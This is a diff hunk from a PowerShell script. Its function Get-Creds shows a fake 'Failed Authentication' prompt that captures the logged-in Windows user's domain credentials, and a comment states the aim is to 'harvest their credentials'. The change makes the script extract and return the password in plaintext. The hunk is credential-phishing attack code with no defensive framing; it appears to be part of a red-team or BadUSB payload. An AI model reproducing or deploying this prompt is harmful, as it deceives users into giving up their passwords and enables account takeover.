@@ -26,17 +26,18 @@
 
 # This is to generate the ui.prompt you will use to harvest their credentials
 function Get-Creds {
-    do {
-        $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
-        if ([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-            [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
-            Get-Creds
-        }
-        return $cred
-        # ...
+do{
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
+    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
+    Get-Creds
+}
+$creds = $cred.GetNetworkCredential() | fl
+return $creds
+  # ...
 
-        $done = $true
-    } until ($done)
+  $done = $true
+} until ($done)
 
 }
 
